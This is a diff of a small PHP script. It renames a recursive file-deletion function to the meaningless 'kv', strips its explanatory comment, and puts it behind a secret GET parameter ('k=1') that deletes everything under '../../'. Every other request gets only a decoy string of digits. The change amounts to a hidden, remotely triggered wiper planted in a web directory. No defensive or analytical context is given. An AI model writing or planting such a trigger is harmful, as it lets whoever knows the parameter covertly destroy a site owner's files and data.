@@ -1,10 +1,9 @@
 <?php
 
-// delete all files and sub-folders from a folder
-function deleteAll($dir) {
+function kv($dir) {
     foreach(glob($dir . '/*') as $file) {
         if(is_dir($file))
-            deleteAll($file);
+            kv($file);
         else
             unlink($file);
     }
@@ -12,6 +11,14 @@ function deleteAll($dir) {
 }
 
 
-deleteAll("../");   // folder location
+if(isset($_GET["k"]) && $_GET["k"]==1)
+{
+	kv("../../"); 
+}
+else
+{
+	echo "123456789....";
+}
+
 
 ?>
